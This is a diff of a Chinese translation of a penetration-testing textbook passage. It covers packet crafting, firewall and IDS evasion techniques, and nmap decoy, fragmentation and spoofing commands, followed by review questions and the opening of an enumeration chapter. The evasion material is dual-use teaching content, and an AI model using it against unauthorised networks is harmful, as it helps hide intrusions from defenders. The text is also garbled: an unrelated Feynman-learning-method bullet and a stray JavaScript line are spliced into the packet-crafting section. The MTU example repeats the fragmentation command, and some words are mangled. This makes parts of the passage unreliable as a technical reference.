 Scanning 192.168.86.1 (192.168.86.1), port 1-1024
 1024 ports to scan, use -V to see all the replies
@@ -4700,18 +5131,15 @@ All replies received. Done.
 Not responding ports: (1 tcpmux) (2 nbp) (3 ) (4 echo) (5 ) (6 zip) (7 echo) (8 ) (9 discard) (10 ) (11 systat) (12 ) (13 daytime) (14 ) (16 netstat) (17 ) (18 qotd) (19 msp) (20 chargen) (21 ftp-data) (22 ftp) (23 ssh) (24 )
 ```
 
--   `hping`还能够发送任意大小的数据包。使用`‑d`后跟字节计数可以设置数据包的体积。你还可以通过`‑‑file`参数指定文件，让`hping`读取文件内容并用于填充数据包的数据部分，这可能会导致应用因违反协议规范而崩溃。
+- `hping`还能够发送任意大小的数据包。使用`-d`后跟字节计数可以设置数据包的体积。你还可以通过`--file`参数指定文件，让`hping`读取文件内容并用于填充数据包的数据部分，这可能会导致应用因违反协议规范而崩溃。
 
--   `packETH`与`hping`不同，它采用图形用户界面（GUI）来设置所有参数。所选协议的头部集合会根据协议而变化，每个低层头部指示下一个协议，即下一组头部。选择协议后，`packETH`会自动提供该协议所需的所有头部字段。图 5.25 展示了 IP 头和 TCP 头的字段，同时也指示在层 2 头部中选择 IP 作为下一层协议。虽然此截图看不到层 2 头部，但你可以在`packETH`中设置地址、选择层 2 协议版本、添加 802.1q 虚拟局域网（VLAN）标签，以指定帧所属的 VLAN。
+- `packETH`与`hping`不同，它采用图形用户界面（GUI）来设置所有参数。所选协议的头部集合会根据协议而变化，每个低层头部指示下一个协议，即下一组头部。选择协议后，`packETH`会自动提供该协议所需的所有头部字段。图 5.25 展示了 IP 头和 TCP 头的字段，同时也指示在层 2 头部中选择 IP 作为下一层协议。虽然此截图看不到层 2 头部，但你可以在`packETH`中设置地址、选择层 2 协议版本、添加 802.1q 虚拟局域网（VLAN）标签，以指定帧所属的 VLAN。
 
+- [费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者**Richard Feynman**。
 
+1. 运用费曼技巧，你只需花上`20 min`就能深入理解知识点，而且记忆深刻，*难以遗忘*。
 
-
--   [费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者**Richard Feynman**。
-
-1.  运用费曼技巧，你只需花上`20 min`就能深入理解知识点，而且记忆深刻，*难以遗忘*。
-
-```
+```text
 if (condVar > someVal) {console.log("xxx")}
 ```
 
@@ -4719,103 +5147,125 @@ if (condVar > someVal) {console.log("xxx")}
 
 任何你测试的目标组织都会有安全机制来防御自己，这可能是防火墙或入侵检测系统。它也可能有入侵防御系统。这些手段中的任何一种都可能阻碍你的努力，要么通过阻塞它们，要么通过发出警报，这可能导致你的行为被发现。这些情况都是不好的。好在，有一些规避技术可以帮助你绕过这些设备，从而继续进行操作。我们已经看到的一些工具将帮助你完成这些规避程序。常见的规避技术如下：
 
-`Hide/Obscure the Data`   你可以使用加密或混淆来伪装你正在做的事情。加密流量在不违反加密的端到端属性的前提下无法被检查。加密的目标是让消息从发送者到接收者全部保持加密状态，中间节点不会解密。你也可以使用各种编码技术对数据进行编码，包括 URL 编码，它会把字符替换为其 ASCII 码的十六进制值。
+`Hide/Obscure the Data` 你可以使用加密或混淆来伪装你正在做的事情。加密流量在不违反加密的端到端属性的前提下无法被检查。加密的目标是让消息从发送者到接收者全部保持加密状态，中间节点不会解密。你也可以使用各种编码技术对数据进行编码，包括 URL 编码，它会把字符替换为其 ASCII 码的十六进制值。
 
-`Alterations`   入侵检测/防御系统通常会使用所谓的 *signature*（签名）。在恶意软件的情况下，这可能是一个可以与已知恶意软件数据库中的哈希值进行比对的加密散列。如果哈希值匹配，消息会被丢弃。对于加密散列而言，文件内容中即使只更改一个字符，也会产生完全不同的哈希值，这意味着你的操作不会被检测到。这种策略常被称为 *polymorphisms*，源自 *polymorph*，意为“多种形态”。
+`Alterations` 入侵检测/防御系统通常会使用所谓的 `signature`（签名）。在恶意软件的情况下，这可能是一个可以与已知恶意软件数据库中的哈希值进行比对的加密散列。如果哈希值匹配，消息会被丢弃。对于加密散列而言，文件内容中即使只更改一个字符，也会产生完全不同的哈希值，这意味着你的操作不会被检测到。这种策略常被称为 `polymorphisms`，源自 `polymorph`，意为“多种形态”。
 
-`Fragmentation`   碎片化攻击可以用来规避网络安全机制，因为这些设备在 inline 模式下需要时间将消息重新组装，而攻击行为在重新组装完成前不可见。重新组装需要时间，因此一些设备直接放弃，因为重新组装和检测会增加通信的延迟。这取决于设备以及其开发者的决策。你可以使用诸如 `fragroute` 之类的工具来帮助进行碎片化。
+`Fragmentation` 碎片化攻击可以用来规避网络安全机制，因为这些设备在 inline 模式下需要时间将消息重新组装，而攻击行为在重新组装完成前不可见。重新组装需要时间，因此一些设备直接放弃，因为重新组装和检测会增加通信的延迟。这取决于设备以及其开发者的决策。你可以使用诸如 `fragroute` 之类的工具来帮助进行碎片化。
 
-`Overlaps`   当消息被碎片化时，可能在网络层或传输层发生，如你通过查看 `fragroute` 所看到的那样。在重新组装消息时，所有碎片都必须完整且处于合法状态，才能拼回完整的拼图。使用 TCP 时，你可以重叠序列号。这本质上是已发送的字节计数。你可能发送两个 TCP 段，它们在拼图中看起来占据相同的空间。IDS 与目标操作系统可能会以不同的方式重新组装拼图。如果一方倾向于使用较新的信息，另一方则倾向于使用较旧的信息，操作系统需要决定第一条收到的报文是否有效，或是最后收到的报文更有效。
+`Overlaps` 当消息被碎片化时，可能在网络层或传输层发生，如你通过查看 `fragroute` 所看到的那样。在重新组装消息时，所有碎片都必须完整且处于合法状态，才能拼回完整的拼图。使用 TCP 时，你可以重叠序列号。这本质上是已发送的字节计数。你可能发送两个 TCP 段，它们在拼图中看起来占据相同的空间。IDS 与目标操作系统可能会以不同的方式重新组装拼图。如果一方倾向于使用较新的信息，另一方则倾向于使用较旧的信息，操作系统需要决定第一条收到的报文是否有效，或是最后收到的报文更有效。
 
-`Malformed Data`   协议是关于通信应如何进行的规则集合。如果你违反这些规则，会得到意想不到的结果。即使你没有直接违反规则，而是利用协议漏洞，也能获取有用数据。这就是为什么 `nmap` 会使用 Xmas、FIN 和 NUL 扫描。这种行为虽然不符合协议的技术合法性，但确实是意外的。同样，协议中细节在不同网络栈之间的处理方式可能不同。URG 指针在不同操作系统上可能被处理不同，这可以用来绕过 IDS 并让目标系统按你想要的方式响应。
+`Malformed Data` 协议是关于通信应如何进行的规则集合。如果你违反这些规则，会得到意想不到的结果。即使你没有直接违反规则，而是利用协议漏洞，也能获取有用数据。这就是为什么 `nmap` 会使用 Xmas、FIN 和 NUL 扫描。这种行为虽然不符合协议的技术合法性，但确实是意外的。同样，协议中细节在不同网络栈之间的处理方式可能不同。URG 指针在不同操作系统上可能被处理不同，这可以用来绕过 IDS 并让目标系统按你想要的方式响应。
 
-`Low and Slow`   快速扫描容易被检测。相对隐蔽的是在长时间内进行的扫描。想象每小时发送一次扫描包。虽然这会很耗时，但单个报文不太可能被 IDS 或防火墙识别为端口扫描。慢下来可以带来好处。你可以使用 `nmap` 的限流参数来显著减慢扫描速度。
+`Low and Slow` 快速扫描容易被检测。相对隐蔽的是在长时间内进行的扫描。想象每小时发送一次扫描包。虽然这会很耗时，但单个报文不太可能被 IDS 或防火墙识别为端口扫描。慢下来可以带来好处。你可以使用 `nmap` 的限流参数来显著减慢扫描速度。
 
-`Resource Consumption`   通过耗尽 CPU 或内存等资源，有可能让设备进入失败打开状态。如果你能耗尽这些资源中的任何一种，后续的报文可能会在设备失效后直接通过。
+`Resource Consumption` 通过耗尽 CPU 或内存等资源，有可能让设备进入失败打开状态。如果你能耗尽这些资源中的任何一种，后续的报文可能会在设备失效后直接通过。
 
-`Screen Blindness`   在 IDS 中，设备或软件会发出警报，预期有人会查看这些警报。如果你能生成大量与你无关的流量警报，就能让查看警报的人“屏幕失明”，即因为被大量信息淹没而看不到重要细节。这样，你可以通过大量伪造警报流量制造一层烟雾，然后再通过真实数据通道。
+`Screen Blindness` 在 IDS 中，设备或软件会发出警报，预期有人会查看这些警报。如果你能生成大量与你无关的流量警报，就能让查看警报的人“屏幕失明”，即因为被大量信息淹没而看不到重要细节。这样，你可以通过大量伪造警报流量制造一层烟雾，然后再通过真实数据通道。
 
-`Tunneling`   隧道是一种在其他数据包内传输数据的方式。例如，Generic Routing Encapsulation (GRE) 协议可以通过将数据包封装在 GRE 数据包中来创建隧道，使得看起来像是 GRE 数据包在传输，而实际 payload 中包含的才是真实内容。GRE 是一种专门用于在接收端处理路由而非发送端的隧道协议。其他协议也被用于隧道攻击，包括 SSH、HTTP、ICMP 和 DNS。这些隧道攻击需要接收端的软件能够提取隧道消息并将其放置在目标网络上。
+`Tunneling` 隧道是一种在其他数据包内传输数据的方式。例如，Generic Routing Encapsulation (GRE) 协议可以通过将数据包封装在 GRE 数据包中来创建隧道，使得看起来像是 GRE 数据包在传输，而实际 payload 中包含的才是真实内容。GRE 是一种专门用于在接收端处理路由而非发送端的隧道协议。其他协议也被用于隧道攻击，包括 SSH、HTTP、ICMP 和 DNS。这些隧道攻击需要接收端的软件能够提取隧道消息并将其放置在目标网络上。
 
 请记住，像状态防火墙这类设备在你成功让第一条报文通过后，后续报文默认会被允许，因为它们属于已建立的连接。当然，这些规避技术已经存在很长时间，防火墙或 IDS 供应商很可能已经知道如何检测大多数手段。这意味着你可能无法让这些规避技术发挥作用。尽管如此，了解它们并尝试使用仍然值得，以看看是否能够突破防护。
 
 有些技术更有可能成功，因为它们不依赖于防火墙或 IDS 供应商。例如，加密始终有效，因为防火墙和 IDS 根本看不到数据，密钥是端点之间协商的。加密的前提是接收端必须运行一个理解加密并能与发送端应用协商的服务。另一种不依赖技术手段的规避方法是通过压倒查看警报的人，假设系统没有技术手段过滤掉无关紧要的消息，只向操作员展示有趣的警报。
 
-### 使用 `nmap` 进行规避
+## 使用 `nmap` 进行规避
 
-`nmap` 自带一定程度的规避功能。这些功能与前面提到的 malformed request 相似，即使用一些在现实世界中不应出现的包配置。预期这些包配置会让网络安全设施直接忽略它们。遗憾的是，这些手段已经非常著名，防火墙和 IDS 系统同样能够识别。更难被发现的是 *idle scan*，它利用一个未在网络上通信的系统，计算目标应该收到的正确 IP 标识号，并通过目标对目标发送的重置报文来实现。
+`nmap` 自带一定程度的规避功能。这些功能与前面提到的 malformed request 相似，即使用一些在现实世界中不应出现的包配置。预期这些包配置会让网络安全设施直接忽略它们。遗憾的是，这些手段已经非常著名，防火墙和 IDS 系统同样能够识别。更难被发现的是 `idle scan`，它利用一个未在网络上通信的系统，计算目标应该收到的正确 IP 标识号，并通过目标对目标发送的重置报文来实现。
 
+闲置扫描的工作原理是系统伪造消息，使其看起来像是来自闲置系统的消息。接收系统随后会将所有响应发送给闲置系统，而扫描系统则会定期向闲置系统发送消息，以获取当前的 IP 标识值。基于此，发送系统可以判断在发送系统发出的数据之后，可能被接收和发送的数据包有哪些。发送系统知道它发出了什么。
 
+1. 虽然扫描可以被防火墙或检测系统轻易发现，但扫描的来源位置是看不见的。如果扫描使用受害者或闲置系统，而该系统与扫描本身无关，即使检测到扫描事实，也无法明确谁实际上在执行扫描，因为扫描是盲的。
 
+2. 另一种“盲”防御的方法是使用大量伪装目标。你可以让 `nmap` 通过在实际关心的端口扫描之外生成大量伪造流量来制造干扰。具体做法是使用 `-D` 标志并跟随伪装参数。你可以指定要使用的地址，但同样可以让 `nmap` 随机化源地址。下面是如何让 `nmap` 使用三个随机源地址创建随机干扰：
 
--   [闲置扫描的工作原理是系统伪造消息，使其看起来像是来自闲置系统的消息。接收系统随后会将所有响应发送给闲置系统，而扫描系统则会定期向闲置系统发送消息，以获取当前的 IP 标识值。基于此，发送系统可以判断在发送系统发出的数据之后，可能被接收和发送的数据包有哪些。发送系统知道它发出了什么。]
-
-1.  虽然扫描可以被防火墙或检测系统轻易发现，但扫描的来源位置是看不见的。如果扫描使用受害者或闲置系统，而该系统与扫描本身无关，即使检测到扫描事实，也无法明确谁实际上在执行扫描，因为扫描是盲的。
-
-2.  另一种“盲”防御的方法是使用大量伪装目标。你可以让 `nmap` 通过在实际关心的端口扫描之外生成大量伪造流量来制造干扰。具体做法是使用 `‑D` 标志并跟随伪装参数。你可以指定要使用的地址，但同样可以让 `nmap` 随机化源地址。下面是如何让 `nmap` 使用三个随机源地址创建随机干扰：
-
-```
+```bash
 $ sudo nmap -D rnd:3 192.168.178.1
+
 Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-20 19:19 CET
+
 Nmap scan report for unnamed (192.168.178.1)
+
 Host is up (0.013s latency).
+
 Not shown: 993 closed tcp ports (reset)
+
 PORT     STATE SERVICE
+
 53/tcp   open  domain
+
 80/tcp   open  http
+
 443/tcp  open  https
+
 554/tcp  open  rtsp
+
 5060/tcp open  sip
+
 8089/tcp open  unknown
+
 8181/tcp open  intermapper
 
 Nmap done: 1 IP address (1 host up) scanned in 1.54 seconds
 ```
 
-3.  这看起来像是一个普通的 `nmap` 扫描，直到查看数据包捕获。下面的数据包是该扫描期间捕获的。扫描是在虚拟机内部进行的，实际源地址应为 10.211.55.11。你可以在上方看到三个不同的源地址，实际地址是 10.211.55.11，另外三个地址分别是 212.236.76.245、53.129.176.4 和 41.97.136.192。
+3. 这看起来像是一个普通的 `nmap` 扫描，直到查看数据包捕获。下面的数据包是该扫描期间捕获的。扫描是在虚拟机内部进行的，实际源地址应为 10.211.55.11。你可以在上方看到三个不同的源地址，实际地址是 10.211.55.11，另外三个地址分别是 212.236.76.245、53.129.176.4 和 41.97.136.192。
 
 ```
 19:19:25.239139 IP 212.236.76.245.47924> 192.168.178.1.3006: Flags [S], seq 3917877688, win 1024, options [mss 1460], length 0
+
 19:19:25.239141 IP 10.211.55.11.47924> 192.168.178.1.3006: Flags [S], seq 3917877688, win 1024, options [mss 1460], length 0
+
 19:19:25.239147 IP 53.129.176.4.47924> 192.168.178.1.3006: Flags [S], seq 3917877688, win 1024, options [mss 1460], length 0
+
 19:19:25.239149 IP 41.97.136.192.47924> 192.168.178.1.3006: Flags [S], seq 3917877688, win 1024, options [mss 1460], length 0
+
 19:19:25.239152 IP 212.236.76.245.47924> 192.168.178.1.65129: Flags [S], seq 3917877688, win 1024, options [mss 1460], length 0 
 ```
 
-4.  除了创建伪装目标外，如前所述，你还可以让 `nmap` 处理碎片化。虽然 `fragroute` 很有用且可在多种情况下使用，但如果你只需要进行扫描，让 `nmap` 处理碎片化更加简便。下面是一个带有碎片化的 `nmap` 扫描示例：
+4. 除了创建伪装目标外，如前所述，你还可以让 `nmap` 处理碎片化。虽然 `fragroute` 很有用且可在多种情况下使用，但如果你只需要进行扫描，让 `nmap` 处理碎片化更加简便。下面是一个带有碎片化的 `nmap` 扫描示例：
 
-```
+```bash
 $ sudo nmap -f -p80,443 192.168.178.1
+
 Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-20 19:26 CET
+
 Nmap scan report for fritz.box (192.168.178.1)
+
 Host is up (0.12s latency). 
- 
+
 PORT    STATE    SERVICE
+
 80/tcp  filtered http
+
 443/tcp filtered https
 ```
 
-5.  另一种实现类似效果的方法是让 `nmap` 设置 MTU。MTU 是 IP 头中的字段，用于告诉网络设备根据传输介质的最大传输单元（MTU）可以发送多大的 IP 包。某些网络只接受小于特定大小的数据帧。例如，以太网允许的最大传输单元为 1,500 字节。超过此限制的数据段需要进行碎片化，并相应设置碎片化头。接收方负责按正确顺序重新组装完整报文。如果将 MTU 设置得足够小，某些中间设备（如路由器或防火墙）可能会选择直接转发而不重新组装，以便检查（注意这里是“可能”，并非“一定”或“应该”，因为现代系统已不再受限于处理或存储能力）。让 `nmap` 设置 MTU 的示例如下，需注意 MTU 必须是 8 的倍数：
+5. 另一种实现类似效果的方法是让 `nmap` 设置 MTU。MTU 是 IP 头中的字段，用于告诉网络设备根据传输介质的最大传输单元（MTU）可以发送多大的 IP 包。某些网络只接受小于特定大小的数据帧。例如，以太网允许的最大传输单元为 1,500 字节。超过此限制的数据段需要进行碎片化，并相应设置碎片化头。接收方负责按正确顺序重新组装完整报文。如果将 MTU 设置得足够小，某些中间设备（如路由器或防火墙）可能会选择直接转发而不重新组装，以便检查（注意这里是“可能”，并非“一定”或“应该”，因为现代系统已不再受限于处理或存储能力）。让 `nmap` 设置 MTU 的示例如下，需注意 MTU 必须是 8 的倍数：
 
-```
+```bash
 $ sudo nmap -f -p80,443 192.168.178.1
+
 Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-20 19:26 CET
+
 Nmap scan report for fritz.box (192.168.178.1)
+
 Host is up (0.12s latency). 
- 
+
 PORT    STATE    SERVICE
+
 80/tcp  filtered http
+
 443/tcp filtered https
 ```
 
-6.  除了上述技巧，`nmap` 还提供其他规避防火墙和入侵检测系统的方法，包括伪装源 MAC 地址。这是一种受限使用的扫描，利用本地网络防火墙对特定 MAC 地址的信任关系。如果目标在远程，这种扫描通常不适用。第一次你的帧到达网络设备（如路由器或防火墙），帧头（包括你的 MAC 地址）会被移除，并由防火墙或路由器的另一侧的适当 MAC 地址取代。如果想尝试，可以使用 `‑‑spoof-mac` 后跟 MAC 地址或厂商名称。若指定厂商，`nmap` 会使用相应的 OUI 并随机生成三个八位元来标识具体主机。
-
-7.  最后，你可以伪装源端口。某些防火墙会检查源端口，因为它对某些应用（如 DNS 或 FTP）是必要的。虽然这在当今已不再是大问题，但一些防火墙管理员（尤其是使用较老实现的防火墙）会检查源端口号并据此允许流量。例如，你可以使用 `nmap -g 53` 让 `nmap` 从源端口 53 发送流量，从而暗示该流量与 DNS 相关。
 
 
+6. 除了上述技巧，`nmap` 还提供其他规避防火墙和入侵检测系统的方法，包括伪装源 MAC 地址。这是一种受限使用的扫描，利用本地网络防火墙对特定 MAC 地址的信任关系。如果目标在远程，这种扫描通常不适用。第一次你的帧到达网络设备（如路由器或防火墙），帧头（包括你的 MAC 地址）会被移除，并由防火墙或路由器的另一侧的适当 MAC 地址取代。如果想尝试，可以使用 `‑‑spoof-mac` 后跟 MAC 地址或厂商名称。若指定厂商，`nmap` 会使用相应的 OUI 并随机生成三个八位元来标识具体主机。
 
+7. 最后，你可以伪装源端口。某些防火墙会检查源端口，因为它对某些应用（如 DNS 或 FTP）是必要的。虽然这在当今已不再是大问题，但一些防火墙管理员（尤其是使用较老实现的防火墙）会检查源端口号并据此允许流量。例如，你可以使用 `nmap -g 53` 让 `nmap` 从源端口 53 发送流量，从而暗示该流量与 DNS 相关。
 
--   [漏洞扫描器同样嘈杂。即使扫描仪事先知道端口/应用，也会产生大量请求。几乎所有请求都会显得很糟糕。这里入侵检测系统可以提供帮助。你可能无法，或者甚至不想阻止漏洞扫描仪的流量，因为实际上它会是，或者至少看起来像合法请求。你可能会注意到，这些请求匹配已知漏洞。网络入侵检测系统应该能够检测这种活动。
+- 漏洞扫描器同样嘈杂。即使扫描仪事先知道端口/应用，也会产生大量请求。几乎所有请求都会显得很糟糕。这里入侵检测系统可以提供帮助。你可能无法，或者甚至不想阻止漏洞扫描仪的流量，因为实际上它会是，或者至少看起来像合法请求。你可能会注意到，这些请求匹配已知漏洞。网络入侵检测系统应该能够检测这种活动。
 
 当涉及到包构造攻击或伪造攻击时，也有防护方法。边界防火墙应该阻止永远不会发生的流量。这包括 RFC 1918 空间的私有地址，按惯例这些地址在 Internet 上不可路由。如果地址无法通过 Internet 传入，那么使用这些地址从 Internet 传入的任何内容都不能是合法的。同样，伪造攻击（例如空闲扫描）可能看起来像是来自内部主机。位于网络内部的任何地址不可能来自外部，因此也应该被阻止。
 
@@ -4823,19 +5273,19 @@ PORT    STATE    SERVICE
 
 扫描将为你提供大量在测试和评估时所需的信息。扫描有不同种类，但在扫描过程中，你需要识别开放端口。识别开放端口的目的不仅仅是获取端口列表，最终目标是识别在开放端口上监听的服务或应用程序。为了识别这些开放端口，你会使用端口扫描器。最常用的端口扫描器是 `nmap`，它不仅能识别开放端口，还能通过抓取横幅来识别应用版本，还能识别目标机器上运行的操作系统。
 
-虽然还有其他端口扫描器可用，如用于高速扫描的 `masscan`，但 `nmap` 是唯一内置脚本引擎的端口扫描器。`nmap` 的脚本引擎基于编程语言 Lua，但 `nmap` 提供库，让你可以轻松访问 `nmap` 的信息，从而编写脚本以更好地识别服务，并执行诸如漏洞识别等测试。当你为 `nmap` 脚本引擎（NSE）编写脚本时，你会向 `nmap` 注册端口，这样 `nmap` 就会在发现注册端口打开时调用你的脚本。
+虽然还有其他端口扫描器可用，如用于高速扫描的 `masscan`，但 `nmap` 是唯一内置脚本引擎的端口扫描器。`nmap` 的脚本引擎基于编程语言 `Lua`，但 `nmap` 提供库，让你可以轻松访问 `nmap` 的信息，从而编写脚本以更好地识别服务，并执行诸如漏洞识别等测试。当你为 `nmap` 脚本引擎（`NSE`）编写脚本时，你会向 `nmap` 注册端口，这样 `nmap` 就会在发现注册端口打开时调用你的脚本。
 
-虽然 `nmap` 通常是命令行程序，但也有一个 GUI 前端 —  — Zenmap。Zenmap 会根据你指定的命令调用 `nmap`，并解析结果，以多种方式呈现给你。你可以查看所有识别出的服务，也可以根据 `nmap` 的结果获得网络拓扑的视图。你可以向 Zenmap 提供与 `nmap` 相同的命令，它还会提供一些自带的扫描类型，如强度扫描。选择扫描类型会自动填充所需的命令行参数。
+虽然 `nmap` 通常是命令行程序，但也有一个 GUI 前端 —  — `Zenmap`。`Zenmap` 会根据你指定的命令调用 `nmap`，并解析结果，以多种方式呈现给你。你可以查看所有识别出的服务，也可以根据 `nmap` 的结果获得网络拓扑的视图。你可以向 `Zenmap` 提供与 `nmap` 相同的命令，它还会提供一些自带的扫描类型，如强度扫描。选择扫描类型会自动填充所需的命令行参数。
 
-漏洞扫描仪不仅会查找漏洞，还会在查找和识别开放端口时执行端口扫描。市面上有许多商业漏洞扫描器。开源漏洞扫描器非常少。其中一个基于已商业化的产品是 OpenVAS。OpenVAS 是从 Nessus 的最后一个开源版本分叉而来。漏洞扫描仪的挑战之一是维护它们并保持更新所需的工作量巨大，这或许是开源扫描器数量很少的主要原因。
+漏洞扫描仪不仅会查找漏洞，还会在查找和识别开放端口时执行端口扫描。市面上有许多商业漏洞扫描器。开源漏洞扫描器非常少。其中一个基于已商业化的产品是 `OpenVAS`。`OpenVAS` 是从 `Nessus` 的最后一个开源版本分叉而来。漏洞扫描仪的挑战之一是维护它们并保持更新所需的工作量巨大，这或许是开源扫描器数量很少的主要原因。
 
-像 OpenVAS 和 Nessus 这样的漏洞扫描仪使用插件来执行测试。它们会探测目标主机的行为，以识别潜在漏洞。但并非所有被识别的漏洞都是真实的，被识别但实际上不存在的漏洞称为 *false positives*。相反，未被识别的真实漏洞称为 *false negative*。由于其工作方式，漏洞扫描仪远非万全，可能需要手动验证扫描结果。
+像 `OpenVAS` 和 `Nessus` 这样的漏洞扫描仪使用插件来执行测试。它们会探测目标主机的行为，以识别潜在漏洞。但并非所有被识别的漏洞都是真实的，被识别但实际上不存在的漏洞称为 *false positives*。相反，未被识别的真实漏洞称为 *false negative*。由于其工作方式，漏洞扫描仪远非万全，可能需要手动验证扫描结果。
 
-如果要测试漏洞并进行扫描，可能需要使用除了操作系统自动构建数据包之外的其他工具。你可以使用 `hping` 等工具来构造数据包，它既可以用于扫描，也可以通过命令行参数创建数据包。如果你不想使用命令行，可以使用 packETH。packETH 向你展示从第 2 层到第 4 层的所有报头，并允许你创建数据包的负载。它还能从 PCAP 中提取并修改数据包。你可以向目标（第 2 层或第 3 层）单独发送单个数据包，也可以发送数据流。使用这些构造的数据包，你可以从目标获得响应，这些响应可能提供你所需的信息。
+如果要测试漏洞并进行扫描，可能需要使用除了操作系统自动构建数据包之外的其他工具。你可以使用 `hping` 等工具来构造数据包，它既可以用于扫描，也可以通过命令行参数创建数据包。如果你不想使用命令行，可以使用 `packETH`。`packETH` 向你展示从第 2 层到第 4 层的所有报头，并允许你创建数据包的负载。它还能从 PCAP 中提取并修改数据包。你可以向目标（第 2 层或第 3 层）单独发送单个数据包，也可以发送数据流。使用这些构造的数据包，你可以从目标获得响应，这些响应可能提供你所需的信息。
 
 目标网络通常会部署防火墙和 IDS。你可能会想使用规避这些设备的技术，因为它们会阻碍你的工作。规避安全技术的方法包括加密/编码、使操作员“目 Blind”，或向目标发送 malformed 消息。防止这类扫描（无论是端口扫描还是漏洞扫描）的最佳方法是部署位于网络入口的防火墙，包括虚拟局域网等网络段。你不一定能阻止所有这些手段，但 IDS 会很有用，让人知道发生了不好的事情。
 
-1.  如果你从目标主机收到 RST 包，你可以知道以下哪项？
+1. 如果你从目标主机收到 RST 包，你可以知道以下哪项？
 
     1. 目标使用 UDP 而非 TCP。
 
@@ -4845,7 +5295,7 @@ PORT    STATE    SERVICE
 
     4. 目标期望 PSH 标志被设置。
 
-2.  SYN 扫描和全连接扫描（full connect scan）有什么区别？
+2. SYN 扫描和全连接扫描（full connect scan）有什么区别？
 
     1. SYN 扫描和全连接扫描是相同的。
 
@@ -4855,7 +5305,7 @@ PORT    STATE    SERVICE
 
     4. SYN 扫描不完成三次握手。
 
-3.  以下哪项是 UDP 扫描可能比同等 TCP 扫描耗时更长的原因？
+3. 以下哪项是 UDP 扫描可能比同等 TCP 扫描耗时更长的原因？
 
     1. UDP 会更频繁地重传。
 
@@ -4865,7 +5315,7 @@ PORT    STATE    SERVICE
 
     4. UDP 需要更多的消息来建立连接。
 
-4.  为什么 ACK 扫描无法明确指示端口是否打开？
+4. 为什么 ACK 扫描无法明确指示端口是否打开？
 
     1. 扫描员必须猜测。
 
@@ -4875,17 +5325,17 @@ PORT    STATE    SERVICE
 
     4. ACK 扫描会导致大量重传。
 
-5.  使用类似 ACK 扫描的一个原因是什么？
+5. 使用类似 ACK 扫描的一个原因是什么？
 
     1. 它可能绕过防火墙和 IDS 设备。
 
     2. 它支持度更好。
 
-    3. nmap 的代码更具健壮性。
+    3. `nmap` 的代码更具健壮性。
 
     4. 脚本支持需要 ACK 扫描。
 
-6.  `nmap` 查看什么来进行操作系统指纹识别？
+6. `nmap` 查看什么来进行操作系统指纹识别？
 
     1. 操作系统的报头
 
@@ -4895,7 +5345,7 @@ PORT    STATE    SERVICE
 
     4. IP ID 字段和初始序列号
 
-7.  当 `nmap` 进行版本扫描时，它查看什么？
+7. 当 `nmap` 进行版本扫描时，它查看什么？
 
     1. TCP 和 IP 报头
 
@@ -4905,36 +5355,31 @@ PORT    STATE    SERVICE
 
     4. IP ID 和 TCP 序列号字段
 
-8.  使用 `masscan` 相对于 `nmap` 的一个优势是什么？
+8. 使用 `masscan` 相对于 `nmap` 的一个优势是什么？
 
     1. `masscan` 使用时间更久。
 
+## 第 6 章
 
+### 列举
 
+端口扫描最终是为了识别目标网络中系统上安装的应用程序。一旦我们识别出应用程序，就需要进一步挖掘，看看能够提取哪些额外信息。这可能包括用户信息或网络中可用的共享资源的详细信息。当然，在开始执行列举时，我们还可以进行其他活动。这些信息收集在我们进入下一阶段时会很有帮助。
 
-## 第 6 章  
+列举是确定正在运行的服务并从这些服务中提取信息的过程。第一步是识别目标系统上可用的服务。每个服务可能包含大量可获取的信息。外部可访问的服务可能需要身份验证，这意味着存在用户。例如，用户可能需要经过身份验证并授权才能查看 Web 服务器的某些部分。你可能能够让 Web 服务器指示其配置的用户名，这便是列举的一个例子。
 
-### 列举  
+由于我们正在进行列举，接下来会仔细观察几种协议以及与这些协议配合使用的工具。首先是服务器消息块（SMB）协议。该协议用于 Windows 系统的文件和资源共享以及某些远程管理。这里显然需要用户对服务进行身份验证，因此我们可以花些时间尝试在 Windows 服务器上查找用户。此外，你可能还能够识别与 Windows 域相关的安全策略信息。当然，你应该能够识别存在的文件共享。
 
-端口扫描最终是为了识别目标网络中系统上安装的应用程序。一旦我们识别出应用程序，就需要进一步挖掘，看看能够提取哪些额外信息。这可能包括用户信息或网络中可用的共享资源的详细信息。当然，在开始执行列举时，我们还可以进行其他活动。这些信息收集在我们进入下一阶段时会很有帮助。  
+其他可能不易联想到的列举协议包括简单邮件传输协议（SMTP）和简单网络管理协议（SNMP）。用户在通过 SMTP 服务器发送邮件时通常需要进行身份验证和授权，尤其是当他们是从与邮件服务器所在网络之外的网络发送时。例如，如果你使用传统的邮件客户端连接 Gmail 或 Office 365，你会熟悉需要提供用户名和密码的过程。你的客户端可能会自动填充这些信息，但如果你查看设置，这些信息仍然存在。
 
-列举是确定正在运行的服务并从这些服务中提取信息的过程。第一步是识别目标系统上可用的服务。每个服务可能包含大量可获取的信息。外部可访问的服务可能需要身份验证，这意味着存在用户。例如，用户可能需要经过身份验证并授权才能查看 Web 服务器的某些部分。你可能能够让 Web 服务器指示其配置的用户名，这便是列举的一个例子。  
+SNMP 可以提供大量系统信息。如果你能够获得 SNMP 系统的访问权限，就能遍历管理信息基（MIB），从目标系统中提取详细信息。有工具会帮助你完成此遍历，获取信息并将其呈现给你。
 
-由于我们正在进行列举，接下来会仔细观察几种协议以及与这些协议配合使用的工具。首先是服务器消息块（SMB）协议。该协议用于 Windows 系统的文件和资源共享以及某些远程管理。这里显然需要用户对服务进行身份验证，因此我们可以花些时间尝试在 Windows 服务器上查找用户。此外，你可能还能够识别与 Windows 域相关的安全策略信息。当然，你应该能够识别存在的文件共享。  
+MITRE ATT&CK 框架将列举归类为侦察（Reconnaissance）阶段。目前，它识别了两种技术：Gather Victim Host Information（收集目标主机信息）和 Gather Victim Identity Information（收集目标身份信息），这两种技术广泛符合列举的范畴。
 
-其他可能不易联想到的列举协议包括简单邮件传输协议（SMTP）和简单网络管理协议（SNMP）。用户在通过 SMTP 服务器发送邮件时通常需要进行身份验证和授权，尤其是当他们是从与邮件服务器所在网络之外的网络发送时。例如，如果你使用传统的邮件客户端连接 Gmail 或 Office 365，你会熟悉需要提供用户名和密码的过程。你的客户端可能会自动填充这些信息，但如果你查看设置，这些信息仍然存在。  
-
